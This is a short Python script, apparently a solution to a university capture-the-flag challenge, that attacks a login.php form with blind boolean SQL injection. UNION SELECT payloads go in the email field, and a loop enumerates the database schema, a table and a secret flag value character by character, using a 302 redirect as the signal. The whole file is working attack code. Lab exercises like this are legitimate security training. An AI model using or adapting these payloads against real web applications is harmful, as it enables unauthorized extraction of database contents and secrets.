import requests
from string import ascii_lowercase

print("Sending Requests")

cookies = {'CHALBROKER_USER_ID': 'bh1642'}

url = "http://offsec-chalbroker.osiris.cyber.nyu.edu:1241/login.php"

params = {'email': "' UNION SELECT value, 2, 3  FROM logmein.secrets WHERE value = 'flag{__r_ally_d_nt_have_a_g__d_id_a_for_a_flag_e___c_b_e_d_}' -- ", 'password': 'tsts'}
r = requests.post(url, data=params, cookies=cookies)
print("Welcome" in r.text)

for c in ascii_lowercase + '/{}_':
    #params = {'email': "' UNION SELECT SCHEMA_NAME, 2, 3  FROM information_schema.SCHEMATA WHERE SCHEMA_NAME LIKE 'logmein" + c + "%' -- ", 'password': 'tsts'}
    #params = {'email': "' UNION SELECT TABLE_NAME, 2, 3  FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'logmein' AND TABLE_NAME LIKE 'secrets" + c + "%' -- ", 'password': 'tsts'}
    params = {'email': "' UNION SELECT value, 2, 3  FROM logmein.secrets WHERE value LIKE 'flag{__r_ally_d_nt_have_a_g__d_id_a_for_a_flag_e___c_b_e_d_}" + c + "%' -- ", 'password': 'tsts'}

    r = requests.post(url, data=params, cookies=cookies, allow_redirects=False)
    if r.status_code == 302:
        print("Current Letter: ", c)


#print(r.text)
